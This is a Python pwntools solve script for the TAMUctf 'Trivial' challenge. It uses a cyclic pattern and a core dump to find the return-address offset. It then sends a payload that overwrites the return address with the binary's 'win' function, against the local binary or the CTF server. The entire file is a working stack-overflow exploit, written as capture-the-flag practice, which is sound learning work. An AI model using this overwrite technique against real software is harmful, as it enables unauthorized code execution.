#!/usr/bin/env python3

'''
WhatTheFuzz's submission for the TAMUctf challenge Trivial.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
'''

from pwn import *

exe = ELF('trivial')

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote("tamuctf.com", 443, ssl=True, sni="trivial")
    else:
        io = process([exe.path])

    return io


def get_offset():
    '''Get the offset to the return address.'''
    pattern = cyclic(500, n=exe.bytes)

    # Send the pattern to the program.
    io = process([exe.path])
    io.sendline(pattern)

    # Open the coredump.
    io.wait()
    core = io.corefile

    assert pack(core.fault_addr) in pattern, 'Fault not in cyclic pattern.'
    log.info(f'The faulting address is: {hex(core.fault_addr)}')
    
    # Find the offset in the pattern.
    offset = cyclic_find(pack(core.fault_addr), n=exe.bytes)
    log.info(f'The offset to the return address is: {offset}')
    return offset


def main():
    '''Return the flag.
    '''

    # Get the offset to the return address.
    offset = get_offset()

    with conn() as io:

        # Create a payload that will call 'win'.
        win = exe.functions['win']
        payload = fit({
            offset: win
        })

        # Send it.
        io.sendline(payload)
        
        # Get the flag.
        io.interactive()


if __name__ == '__main__':
    main()
